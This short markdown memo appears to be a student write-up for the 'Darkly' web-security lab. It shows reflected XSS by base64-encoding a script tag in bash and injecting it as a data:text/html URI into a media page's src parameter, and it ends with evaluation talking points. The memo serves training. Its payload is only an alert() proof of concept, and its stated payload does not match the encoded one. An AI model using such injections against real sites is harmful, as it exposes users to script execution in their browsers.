# 🖼️ XSS via Media URL (base64 / data URI) – MEMO

## 📌 Breach Summary
The Darkly website allows the injection of a data URI (`data:text/html;base64,...`) or JavaScript payload in a media-related request (such as an image viewer or file preview). This leads to **DOM-based or URL-based XSS**, often triggered when the base64-encoded payload is decoded and rendered by the browser.

---

## ✅ Step-by-Step Exploitation

### 1. 🔍 Find the Media Viewer Input
- Look for a page that accepts a media or file path as a URL parameter:
  ```
  http://<target-ip>/?page=media&src=nsa
  ```

### 2. 🧪 Inject a Malicious data URI

use bash to convert the script to base64

echo -n "<script>alert('toto')</script>" | base64
# Output: PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+

Try injecting a payload like:
```text
http://<target-ip>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ
```
(This is the base64 for `<script>alert('XSS')</script>`)

---

## 💬 What to Say During Evaluation

- Explain how `data:` URIs work and why they’re dangerous when unsanitized.
- Discuss XSS via file viewers or media preview URLs.
- Show that the application blindly renders unvalidated base64 or object URLs.

---

## 📚 References

- OWASP A3: Cross-Site Scripting (XSS)
- [MDN: data URI scheme](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs)
- Tools used: browser, base64 encoder

✅ Make sure to demonstrate the payload execution clearly and explain why it works.